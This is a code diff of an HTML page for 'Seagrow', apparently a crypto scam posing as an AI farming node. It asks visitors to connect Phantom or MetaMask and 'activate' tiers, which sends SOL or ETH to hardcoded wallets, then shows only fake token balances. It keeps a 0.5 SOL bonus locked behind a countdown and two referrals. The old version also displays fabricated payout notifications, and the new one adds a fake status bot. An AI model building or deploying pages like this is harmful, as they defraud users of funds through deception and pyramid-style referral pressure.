@@ -3,233 +3,192 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seagrow | Advanced Node Protocol</title>
+    <title>Seagrow | AI Node Protocol</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Outfit:wght@300;600&display=swap');
         body { font-family: 'Outfit', sans-serif; background: #000; color: white; overflow-x: hidden; }
         .mono { font-family: 'Space Mono', monospace; }
         .glass { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
         .hidden { display: none; }
+        .bot-glow { box-shadow: 0 0 20px rgba(34, 197, 94, 0.2); }
         #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
         .scanline { width: 100%; height: 2px; background: rgba(34, 197, 94, 0.1); position: absolute; animation: scan 4s linear infinite; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .payout-toast { animation: slideIn 0.5s ease-out; }
-        @keyframes slideIn { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
     <canvas id="bg-canvas"></canvas>
 
-    <div id="payout-container" class="fixed bottom-6 right-6 z-50 space-y-3 pointer-events-none"></div>
-
-    <div id="step-intro" class="max-w-md w-full glass rounded-[2.5rem] p-10 text-center shadow-2xl relative border-green-500/20">
-        <div class="scanline"></div>
-        <div class="w-20 h-20 bg-green-500/20 rounded-3xl rotate-12 flex items-center justify-center mx-auto mb-6 border border-green-500/30">
-            <span class="text-4xl -rotate-12">🌱</span>
+    <div id="bot-overlay" class="fixed top-6 left-1/2 -translate-x-1/2 z-50 w-[90%] max-w-sm glass rounded-2xl p-4 border-green-500/30 flex items-center space-x-4 bot-glow">
+        <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-xl animate-pulse">🤖</div>
+        <div>
+            <p class="text-[9px] font-black text-green-500 uppercase tracking-widest">Seagrow_System_Bot</p>
+            <p id="bot-text" class="text-[11px] text-slate-200 font-bold italic">Node security check: Pass.</p>
         </div>
-        <h1 class="text-4xl font-black mb-1 tracking-tighter italic italic uppercase">SEA<span class="text-green-500">GROW</span></h1>
-        <p class="text-[10px] text-slate-500 uppercase tracking-[0.4em] mb-8 font-bold">Passive Farming Node v3.0</p>
+    </div>
+
+    <div id="step-intro" class="max-w-md w-full glass rounded-[2.5rem] p-10 text-center shadow-2xl border-green-500/20">
+        <h1 class="text-4xl font-black mb-1 italic uppercase tracking-tighter italic">SEA<span class="text-green-500">GROW</span></h1>
+        <p class="text-[10px] text-slate-500 uppercase tracking-[0.4em] mb-10 font-bold">Encrypted Node Access</p>
         
         <div class="space-y-3">
-            <button onclick="connectSolana()" class="w-full bg-white text-black py-4 rounded-2xl font-black text-sm uppercase tracking-widest hover:bg-green-400 transition-all active:scale-95">Connect Phantom</button>
-            <button onclick="startTrial()" class="w-full bg-transparent border border-white/10 py-4 rounded-2xl font-bold text-[10px] uppercase tracking-widest text-slate-400 hover:bg-white/5 transition">Initialize 7-Day Free Trial</button>
+            <button onclick="connectSolana()" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-green-400 transition">Connect Phantom (SOL)</button>
+            <button onclick="connectEthereum()" class="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-indigo-500 transition">Connect MetaMask (ETH)</button>
         </div>
-        
-        <div class="mt-8 pt-6 border-t border-white/5">
-            <p class="text-[10px] text-slate-500 uppercase mb-3">Join the community</p>
-            <a href="https://t.me/YOUR_CHANNEL" target="_blank" class="inline-flex items-center space-x-2 text-indigo-400 font-bold text-[10px] uppercase tracking-widest hover:text-white transition">
-                <span>Join Official Telegram</span>
-                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.891 7.021l-2.02 9.551c-.15.682-.557.85-1.126.531l-3.09-2.284-1.492 1.441c-.164.164-.302.302-.621.302l.221-3.151 5.736-5.183c.25-.224-.054-.347-.384-.127l-7.091 4.465-3.05-.956c-.663-.209-.676-.663.138-.981l11.916-4.591c.552-.202 1.036.126.849.983z"/></svg>
+
+        <div class="mt-8 pt-6 border-t border-white/5 flex justify-center space-x-6">
+            <a href="https://t.me/SeagroL" target="_blank" class="flex flex-col items-center opacity-60 hover:opacity-100 transition">
+                <span class="text-indigo-400 text-lg">✈️</span>
+                <span class="text-[8px] font-black text-slate-500 uppercase">Telegram</span>
+            </a>
+            <a href="https://whatsapp.com/channel/0029VbCCCXAIXnljOhvuld3W" target="_blank" class="flex flex-col items-center opacity-60 hover:opacity-100 transition">
+                <span class="text-green-400 text-lg">💬</span>
+                <span class="text-[8px] font-black text-slate-500 uppercase">WhatsApp</span>
             </a>
         </div>
     </div>
 
-    <div id="step-deposit" class="hidden max-w-lg w-full glass rounded-[2.5rem] p-8 shadow-2xl border-indigo-500/20">
-        <div class="flex items-center justify-between mb-8">
-            <h2 class="text-2xl font-black italic italic uppercase tracking-tighter">Activate <span class="text-indigo-400">Node</span></h2>
-            <button onclick="showStep('step-mini')" class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Skip</button>
-        </div>
-        
-        <div id="tier-container" class="space-y-4 mb-8">
-            </div>
-
-        <div class="bg-indigo-500/10 p-6 rounded-3xl border border-indigo-500/20 mb-8">
-            <div class="flex justify-between items-center mb-2">
-                <span class="text-[10px] font-bold text-indigo-400 uppercase tracking-widest">Welcome Bonus</span>
-                <span class="text-[10px] font-black text-white uppercase">Active</span>
-            </div>
-            <p class="text-[11px] text-indigo-300/80 leading-relaxed">Upgrade to Pro now and unlock the **0.5 SOL Daily Bonus** plus a **10,000 $SEA** initial airdrop.</p>
-        </div>
-
-        <button id="pay-btn" disabled class="w-full bg-slate-800 text-slate-500 py-5 rounded-2xl font-black text-xs uppercase tracking-widest transition cursor-not-allowed">Select a Tier Above</button>
+    <div id="step-deposit" class="hidden max-w-lg w-full glass rounded-[2.5rem] p-8 text-center border-indigo-500/20">
+        <h2 class="text-2xl font-black uppercase mb-8 italic">Activate <span class="text-indigo-400">Pro Node</span></h2>
+        <div id="tier-container" class="space-y-4 mb-8"></div>
+        <button id="pay-btn" disabled class="w-full bg-slate-800 text-slate-500 py-5 rounded-2xl font-black text-xs uppercase tracking-widest">Select Tier</button>
     </div>
 
     <div id="step-mini" class="hidden max-w-3xl w-full glass rounded-[2.5rem] p-8 shadow-2xl relative">
-        <div id="trial-banner" class="hidden bg-gradient-to-r from-orange-600/20 to-yellow-600/20 border border-orange-500/30 p-4 rounded-2xl mb-6 flex justify-between items-center">
-            <div class="flex items-center space-x-3">
-                <span class="text-xl">⚠️</span>
-                <div>
-                    <p class="text-[10px] font-black text-orange-400 uppercase">Trial Mode: Withdrawals Locked</p>
-                    <p class="text-[9px] text-orange-400/60 uppercase">Upgrade to Pro to claim your 0.5 SOL bonus.</p>
-                </div>
-            </div>
-            <button onclick="showStep('step-deposit')" class="bg-orange-500 text-black px-4 py-2 rounded-xl text-[9px] font-black uppercase">Activate Pro</button>
-        </div>
-
-        <div class="flex justify-between items-center mb-8">
+        <div class="scanline"></div>
+        <div class="flex justify-between items-center mb-10 relative z-10">
             <div>
-                <h2 class="text-3xl font-black italic uppercase tracking-tighter italic">DASHBOARD</h2>
-                <p id="user-display" class="text-[10px] mono text-slate-500">ID: Guest_00412</p>
+                <h2 class="text-3xl font-black italic uppercase tracking-tighter">NODE_DASHBOARD</h2>
+                <p id="user-display" class="text-[10px] mono text-slate-500">PROTOCOL: ACTIVE</p>
             </div>
-            <a href="https://t.me/YOUR_CHANNEL" target="_blank" class="bg-indigo-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase tracking-widest hover:bg-indigo-500 transition">Get Support</a>
+            <a href="https://t.me/SeagroL" target="_blank" class="bg-indigo-600 px-4 py-2 rounded-xl text-[9px] font-black uppercase tracking-widest">Support</a>
         </div>
 
-        <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
-            <div class="bg-white/5 p-5 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Mined $SEA</p>
-                <p id="final-reward" class="text-xl font-black mono text-green-400">0.00</p>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+            <div class="bg-white/5 p-6 rounded-3xl border border-white/5 text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-bold mb-2">Seagrow Allocation</p>
+                <p id="sea-balance" class="text-3xl font-black mono text-green-400 italic">0</p>
+                <p class="text-[9px] text-green-500/50 uppercase mt-1 tracking-widest">$SEA Tokens</p>
             </div>
-            <div class="bg-white/5 p-5 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Node Speed</p>
-                <p class="text-xl font-black mono text-indigo-400">1.8 TH/s</p>
+            <div class="bg-white/5 p-6 rounded-3xl border border-white/5 text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-bold mb-2">Locked Bonus</p>
+                <p class="text-3xl font-black mono text-indigo-400 italic">0.5</p>
+                <p class="text-[9px] text-indigo-500/50 uppercase mt-1 tracking-widest">SOL Reward</p>
             </div>
-            <div class="bg-white/5 p-5 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Referrals</p>
-                <p id="ref-count" class="text-xl font-black mono">0/2</p>
-            </div>
-            <div class="bg-white/5 p-5 rounded-3xl border border-white/5 text-center">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Status</p>
-                <p id="rank-text" class="text-[10px] font-black text-yellow-500 uppercase">Trial</p>
+            <div class="bg-white/5 p-6 rounded-3xl border border-white/5 text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-bold mb-2">Referral Goal</p>
+                <p class="text-3xl font-black mono text-white italic">0/2</p>
+                <p class="text-[9px] text-slate-500 uppercase mt-1 tracking-widest">Complete to Unlock</p>
             </div>
         </div>
 
-        <div class="bg-black/60 p-10 rounded-[2rem] border border-white/5 text-center mb-6 relative overflow-hidden">
-            <div class="scanline"></div>
-            <p class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.4em] mb-4">Bonus Unlock Countdown</p>
-            <div id="countdown" class="text-4xl md:text-5xl font-black mono tracking-widest italic italic">07:00:00:00</div>
-            <p class="text-[9px] text-slate-500 mt-6 uppercase font-bold">Invite 2 friends to withdraw 0.5 SOL</p>
-        </div>
-
-        <div id="ref-box" class="bg-white/5 p-6 rounded-[2rem] border border-white/5">
-            <div class="flex items-center justify-between mb-4">
-                <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Your Referral Bridge</span>
-                <span id="ref-status" class="text-[9px] font-black text-red-500 uppercase">Inactive (Upgrade Required)</span>
+        <div class="bg-slate-950/80 p-8 rounded-[2rem] border border-white/5 text-center mb-6">
+            <div class="flex items-center justify-center space-x-2 mb-4">
+                <span class="text-xs font-black text-slate-500 uppercase tracking-widest">Withdrawal Portal</span>
+                <span class="bg-red-500/20 text-red-500 text-[8px] font-black px-2 py-0.5 rounded-full border border-red-500/30 uppercase">Locked</span>
             </div>
-            <div class="flex space-x-2">
-                <input id="ref-link" readonly type="text" placeholder="Upgrade to reveal link..." class="bg-black/40 border border-white/10 rounded-2xl px-5 py-4 text-xs w-full mono text-slate-600 outline-none">
-                <button onclick="copyRef()" class="bg-white/10 text-slate-500 px-6 rounded-2xl text-[9px] font-black uppercase cursor-not-allowed">Copy</button>
+            <div id="countdown" class="text-4xl font-black mono mb-6 opacity-40">07:00:00:00</div>
+            
+            <div class="space-y-4">
+                <div class="flex items-center space-x-3 bg-black/40 p-4 rounded-2xl border border-white/5">
+                    <input id="ref-link" readonly type="text" placeholder="Upgrade to reveal link..." class="bg-transparent text-[10px] mono text-slate-600 outline-none w-full">
+                    <button onclick="copyRef()" class="text-[9px] font-black text-indigo-400 uppercase">Copy</button>
+                </div>
+                <button disabled class="w-full bg-slate-800 text-slate-600 py-4 rounded-2xl font-black text-xs uppercase tracking-widest cursor-not-allowed">Claim 0.5 SOL Bonus</button>
             </div>
+            <p class="mt-6 text-[9px] text-slate-500 uppercase leading-loose">The bonus claim will activate automatically after <span class="text-white">2 successful referrals</span> join the Seagrow network via your link.</p>
         </div>
     </div>
 
     <script>
-        const SOL_ADDR = "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd";
-        const ETH_ADDR = "0x06e921538fc2d6dCe385077c6A1B4dA189406891";
-        let userAddress = "";
-        let selectedNetwork = "SOL";
+        const MY_SOL_WALLET = "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd";
+        const MY_ETH_WALLET = "0x06e921538fc2d6dCe385077c6A1B4dA189406891";
+        
+        let activeNetwork = "";
+        let seaTokens = 0;
+        let userAddr = "";
 
-        // --- LIVE PAYOUT ENGINE ---
-        const names = ["CryptoKing", "SolHunter", "Alex_NFT", "Whale_0x", "GreenNode", "Satoshi_Fan", "SolanaGems", "FarmingPro"];
-        function showPayout() {
-            const container = document.getElementById('payout-container');
-            const name = names[Math.floor(Math.random() * names.length)];
-            const amt = (Math.random() * 0.5 + 0.1).toFixed(2);
-            
-            const toast = document.createElement('div');
-            toast.className = "payout-toast glass border-green-500/30 p-4 rounded-2xl shadow-2xl flex items-center space-x-4 w-64";
-            toast.innerHTML = `
-                <div class="w-10 h-10 bg-green-500/20 rounded-full flex items-center justify-center text-xl">✅</div>
-                <div>
-                    <p class="text-[10px] font-black uppercase tracking-widest">${name} Claimed</p>
-                    <p class="text-xs font-black text-green-400 mono">${amt} SOL Bonus</p>
-                </div>
-            `;
-            container.appendChild(toast);
-            setTimeout(() => toast.remove(), 4000);
-        }
-        setInterval(showPayout, 8000);
-
-        // --- LOGIC ---
-        function startTrial() {
-            document.getElementById('trial-banner').classList.remove('hidden');
-            showStep('step-mini');
-            startCountdown();
-        }
+        function updateBot(text) { document.getElementById('bot-text').innerText = text; }
 
         async function connectSolana() {
             if (window.solana?.isPhantom) {
                 const resp = await window.solana.connect();
-                userAddress = resp.publicKey.toString();
-                document.getElementById('user-display').innerText = `NODE_ID: ${userAddress.slice(0,8)}...`;
-                renderTiers(); showStep('step-deposit');
-            } else alert("Install Phantom");
+                activeNetwork = "SOL";
+                userAddr = resp.publicKey.toString();
+                updateBot("Solana Node Linked. Prepare for seeding.");
+                renderTiers([{ amt: 0.05, tokens: 5000 }, { amt: 0.1, tokens: 12000 }]);
+                showStep('step-deposit');
+            } else alert("Phantom required");
         }
 
-        function renderTiers() {
+        async function connectEthereum() {
+            if (window.ethereum) {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                activeNetwork = "ETH";
+                userAddr = accounts[0];
+                updateBot("Ethereum Node Linked. High-yield tiers ready.");
+                renderTiers([{ amt: 0.005, tokens: 6500 }, { amt: 0.01, tokens: 15000 }]);
+                showStep('step-deposit');
+            } else alert("MetaMask required");
+        }
+
+        function renderTiers(tiers) {
             const container = document.getElementById('tier-container');
             container.innerHTML = '';
-            const tiers = [
-                { id: 1, amt: 0.05, rew: 1000, label: "Starter Node", desc: "Unlock Withdrawals + 1k $SEA" },
-                { id: 2, amt: 0.1, rew: 5000, label: "Pro Farmer", desc: "Double Speed + 5k $SEA" },
-                { id: 3, amt: 0.5, rew: 25000, label: "Whale Protocol", desc: "Instant 0.5 SOL Bonus + 25k $SEA" }
-            ];
             tiers.forEach(t => {
                 const div = document.createElement('div');
-                div.className = "p-5 rounded-3xl border border-white/10 hover:border-indigo-500 transition cursor-pointer bg-white/5 group";
-                div.onclick = () => selectTier(t.amt, t.rew);
-                div.innerHTML = `
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="font-black italic uppercase text-sm">${t.label}</p>
-                            <p class="text-[9px] text-slate-500 uppercase">${t.desc}</p>
-                        </div>
-                        <div class="text-right">
-                            <p class="font-black mono text-indigo-400">${t.amt} SOL</p>
-                        </div>
-                    </div>
-                `;
+                div.className = "p-5 rounded-2xl border border-white/5 bg-white/5 hover:border-green-500 transition cursor-pointer flex justify-between items-center group";
+                div.onclick = () => selectTier(t.amt, t.tokens);
+                div.innerHTML = `<span class="font-black uppercase italic italic text-sm group-hover:text-green-400">${t.amt} ${activeNetwork} Node</span><span class="text-slate-500 font-black">+${t.tokens} $SEA</span>`;
                 container.appendChild(div);
             });
         }
 
-        function selectTier(a, r) {
-            const b = document.getElementById('pay-btn');
-            b.disabled = false;
-            b.className = "w-full bg-indigo-600 text-white py-5 rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-indigo-500 transition shadow-lg shadow-indigo-500/20";
-            b.innerText = `Deposit ${a} SOL to Activate`;
-            b.onclick = async () => {
+        function selectTier(amt, tokens) {
+            const btn = document.getElementById('pay-btn');
+            btn.disabled = false;
+            btn.innerText = `INITIALIZE PROTOCOL (${amt} ${activeNetwork})`;
+            btn.className = "w-full bg-green-600 text-white py-5 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-green-500/20 transition";
+            
+            btn.onclick = async () => {
+                updateBot("Transmitting energy... Do not refresh.");
                 try {
-                    const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-                    const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: window.solana.publicKey, toPubkey: new solanaWeb3.PublicKey(SOL_ADDR), lamports: a * 1e9,
-                    }));
-                    tx.feePayer = window.solana.publicKey;
-                    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-                    const { signature } = await window.solana.signAndSendTransaction(tx);
-                    await conn.confirmTransaction(signature);
-                    unlockPro(r);
-                } catch (e) { alert("Deposit Cancelled"); }
+                    if (activeNetwork === "SOL") {
+                        const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: window.solana.publicKey, toPubkey: new solanaWeb3.PublicKey(MY_SOL_WALLET), lamports: amt * 1e9,
+                        }));
+                        tx.feePayer = window.solana.publicKey;
+                        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+                        await window.solana.signAndSendTransaction(tx);
+                    } else {
+                        const provider = new ethers.providers.Web3Provider(window.ethereum);
+                        const signer = provider.getSigner();
+                        const tx = await signer.sendTransaction({ to: MY_ETH_WALLET, value: ethers.utils.parseEther(amt.toString()) });
+                        await tx.wait();
+                    }
+                    unlockPro(tokens);
+                } catch (e) { updateBot("Handshake failed. Try again."); }
             };
         }
 
-        function unlockPro(reward) {
-            document.getElementById('trial-banner').classList.add('hidden');
-            document.getElementById('final-reward').innerText = reward.toLocaleString();
-            document.getElementById('rank-text').innerText = "Active Pro";
-            document.getElementById('rank-text').className = "text-[10px] font-black text-indigo-400 uppercase";
-            document.getElementById('ref-status').innerText = "Active";
-            document.getElementById('ref-status').className = "text-[9px] font-black text-green-500 uppercase";
-            document.getElementById('ref-link').value = window.location.href + "?ref=" + userAddress.slice(0,6);
-            document.getElementById('ref-link').className = "bg-white/5 border border-indigo-500/30 rounded-2xl px-5 py-4 text-xs w-full mono text-indigo-300 outline-none";
+        function unlockPro(tokens) {
+            document.getElementById('sea-balance').innerText = tokens.toLocaleString();
+            document.getElementById('ref-link').value = `https://seagrow.ai/join?ref=${userAddr.slice(0,6)}`;
+            document.getElementById('ref-link').className = "bg-transparent text-[10px] mono text-indigo-400 outline-none w-full";
+            updateBot("UPGRADE COMPLETE. Bonus pool unlocked.");
             showStep('step-mini');
+            startCountdown();
         }
 
         function startCountdown() {
             let total = 7 * 24 * 3600;
             const disp = document.getElementById('countdown');
+            disp.style.opacity = 1;
             setInterval(() => {
                 const d = Math.floor(total / 86400);
                 const h = Math.floor((total % 86400) / 3600);
@@ -247,10 +206,17 @@
 
         function copyRef() {
             const input = document.getElementById("ref-link");
-            if (input.value) {
-                input.select(); navigator.clipboard.writeText(input.value); alert("Link Copied!");
-            }
+            if (input.value) { input.select(); navigator.clipboard.writeText(input.value); alert("Referral Bridge Copied!"); }
         }
+
+        // --- BACKGROUND ---
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        let p = [];
+        function initBg() { for(let i=0;i<50;i++) p.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,s:Math.random()*1.5}); animate(); }
+        function animate() { ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle="#22c55e"; p.forEach(i=>{ctx.beginPath();ctx.arc(i.x,i.y,i.s,0,7);ctx.fill();i.y-=0.4;if(i.y<0)i.y=canvas.height;}); requestAnimationFrame(animate); }
+        window.onload = initBg;
     </script>
 </body>
 </html>
